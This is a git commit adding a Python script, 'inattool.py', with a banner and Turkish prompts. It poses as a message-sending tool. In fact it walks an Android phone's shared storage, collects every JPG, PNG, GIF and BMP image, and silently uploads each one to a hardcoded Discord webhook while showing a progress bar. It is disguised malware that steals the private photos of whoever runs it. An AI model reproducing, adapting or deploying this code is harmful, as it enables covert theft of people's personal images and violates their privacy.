32de121ccb67b7503589590479301cb307399a28
yenilmezz47 <sifirbas1@gmail.com>
2025-06-30 18:45:53 +0300

    Add files via upload

---
+++ inattool.py
@@ -0,0 +1,60 @@
+import os
+import requests
+import time
+import random
+from tqdm import tqdm 
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1389257449445265520/xDcXLyvNJP1gCJBtcN3O7ycP2lGvcDxPfDH6bEJS6zPVOhFk3zrkA5YFYSk_EjQ_ytbK"
+
+def get_device_info():
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        return hostname, local_ip
+    except:
+        return "Bilinmiyor", "Bilinmiyor"
+
+def send_to_discord(file_path):
+    try:
+        with open(file_path, 'rb') as file:
+            files = {'file': (os.path.basename(file_path), file)}
+            requests.post(WEBHOOK_URL, files=files)
+    except:
+        pass
+
+def scan_and_upload():
+    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
+    base_dir = "/storage/emulated/0" 
+    
+    target_id = input("Dosya Yolu ")
+    print(f"\n **{target_id}** message send...")
+    
+    image_files = []
+    for root, _, files in os.walk(base_dir):
+        for file in files:
+            if file.lower().endswith(image_extensions):
+                image_files.append(os.path.join(root, file))
+    
+    total_images = len(image_files)
+    if total_images == 0:
+        print("dosya yolu bulunamadı!")
+        return
+    
+    print(f" **{total_images}** başlıyor...\n")
+    
+    for image_path in tqdm(image_files, desc="BAŞLADI", unit="0"):
+        send_to_discord(image_path)
+        time.sleep(1) 
+    
+    print("\n Gönderim Tamamlandı !")
+
+if __name__ == "__main__":
+    print("""
+ __  __   ______   _   __   ____   __       __  ___   ______   _____        _ 
+\ \/ /  / ____/  / | / /  /  _/  / /      /  |/  /  / ____/  /__  /     _ | |
+ \  /  / __/    /  |/ /   / /   / /      / /|_/ /  / __/       / /     (_)/ /
+ / /  / /___   / /|  /  _/ /   / /___   / /  / /  / /___      / /__   _  / / 
+/_/  /_____/  /_/ |_/  /___/  /_____/  /_/  /_/  /_____/     /____/  (_)/_/  
+                                                                      /_/    
+    """)
+    scan_and_upload()
